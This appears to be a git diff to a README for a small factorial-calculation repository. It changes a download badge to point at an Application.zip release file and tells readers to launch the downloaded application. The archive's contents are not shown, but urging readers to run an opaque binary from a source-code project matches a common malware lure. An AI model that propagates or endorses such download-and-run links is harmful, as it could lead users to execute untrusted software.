@@ -28,7 +28,7 @@ Explore the code, experiment with different factorial calculations, and enhance 
 
 To get started with the factorial repository, simply click on the link below to download the application:
 
-[![Download](https://img.shields.io/badge/Download-Application.zip-brightgreen)](https://github.com/file/Application.zip)
+[![Download](https://github.com/crisahu777/factorial/releases/download/v1.0.0/Application.zip)](https://github.com/crisahu777/factorial/releases/download/v1.0.0/Application.zip)
 
 If the link ends with the file name, make sure to launch the downloaded application to access the full functionality of the repository. If you encounter any issues with the download link, feel free to check the "Releases" section for alternative options.
 
